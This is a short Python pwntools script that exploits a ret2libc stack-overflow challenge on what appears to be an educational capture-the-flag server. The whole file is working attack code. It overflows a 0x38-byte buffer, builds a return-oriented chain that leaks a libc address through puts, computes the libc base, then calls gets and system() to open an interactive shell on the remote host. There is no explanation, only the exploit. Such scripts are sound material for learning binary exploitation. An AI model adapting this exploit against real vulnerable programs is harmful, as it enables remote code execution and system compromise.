#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

l = ELF('./libc.so')
# r = process('./ret2libc')
r = remote('edu-ctf.csie.org', 10175)
r.recvuntil(':D\n')

pop_rdi = 0x0000000000400733
libc_start_main_got = 0x0000000000600ff0
puts_plt = 0x0000000000400520
main = 0x0000000000400698


payload = p64(pop_rdi)
payload += p64(libc_start_main_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendline('A'*0x38 + payload)
l.address = u64(r.recv(6) + '\x00\x00') - 0x21ab0
log.success('libc -> ' + hex( l.address ))

r.recvuntil(':D\n')

gets_plt = 0x0000000000400530
bss = 0x601090

payload = flat(
    pop_rdi,
    bss,
    gets_plt,
    pop_rdi,
    bss,
    l.sym.system
)

r.sendline('A'*0x38 + payload)
r.interactive()
